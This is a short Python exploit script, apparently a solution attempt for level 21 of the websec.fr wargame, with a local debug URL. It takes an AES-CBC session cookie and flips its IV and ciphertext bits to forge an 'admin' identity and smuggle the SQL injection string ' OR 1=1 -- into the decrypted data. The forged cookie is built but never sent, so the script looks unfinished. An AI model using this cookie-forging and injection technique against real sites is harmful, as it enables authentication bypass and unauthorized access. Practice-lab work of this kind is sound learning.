import requests
from binascii import hexlify, unhexlify

url = "https://websec.fr/level21/index.php"
url = "http://localhost:1337/test.php"  # debug

def xor(a, b):
    return bytes([a[i] ^ b[i % len(b)] for i in range(len(a))])

def register(username, password):
    data = {
        "username": username,
        "password": password,
        "register": ""
        }
    r = requests.post(url, data=data)

    return r.text

def login(username, password):
    data = {
        "username": username,
        "password": password,
        "login": ""
        }
    r = requests.post(url, data=data)

    return r.cookies.get("session")

user = 'a'*21
passw = "bbbbbb"
cookie = login(user, passw)

iv = unhexlify(cookie[:32])
resto = cookie[32:]

us = f"user/pass:{user[:6]}"
iv_x = xor(iv, us.encode())  # 16
iv_x = xor(iv_x, b"user/pass:admin/")

block1 = unhexlify(resto[:32])

block2 = unhexlify(resto[32:64])

block2 = xor(block2, (b'a'*15) + b'/')
block2 = xor(block2, b"' OR 1=1 --     ")

block3 = unhexlify(resto[64:])

res = hexlify(iv_x) + hexlify(block1) + hexlify(block2) + hexlify(block3)

a = requests.post(url, data={
    'c': cookie
})

print(f"cookie: {cookie}", end="\n\n")
print(f"php: {a.text}")